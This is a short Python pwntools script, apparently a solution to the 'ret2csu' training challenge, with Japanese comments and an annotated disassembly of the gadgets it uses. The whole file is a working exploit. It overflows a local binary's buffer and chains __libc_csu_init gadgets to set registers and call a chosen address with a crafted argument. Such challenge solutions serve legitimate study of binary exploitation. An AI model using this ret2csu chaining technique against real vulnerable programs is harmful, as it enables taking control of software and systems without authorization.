#!/usr/bin/env python3
from pwn import *

target = process("./ret2csu")
#gdb.attach(target, gdbscript="b *0x4007b0")

"""
00400880 4c 89 fa        MOV        RDX,R15
00400883 4c 89 f6        MOV        RSI,R14
00400886 44 89 ef        MOV        EDI,R13D
00400889 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]
--一部省略--
0040089a 5b              POP        RBX
0040089b 5d              POP        RBP
0040089c 41 5c           POP        R12
0040089e 41 5d           POP        R13
004008a0 41 5e           POP        R14
004008a2 41 5f           POP        R15
004008a4 c3              RET

RBX = 0x600e38
r12 = 0x0
"""

csu_gadget_ret  = 0x40089a
csu_gadget_call = 0x400880

#rbpは0x1にしておかないとretにたどり着かない
payload1 = b"0" * 40
payload1 += p64(csu_gadget_ret)
payload1 += p64(0x0) 
payload1 += p64(0x1)
payload1 += p64(0x600e38)
payload1 += p64(0x0) * 2
payload1 += p64(0xdeadcafebabebeef)
payload1 += p64(csu_gadget_call)
#add rsp 0x8 があるのでその分を考慮する
payload1 += p64(0xf) * 7
payload1 += p64(0x4007b1)

target.sendline(payload1)

target.interactive()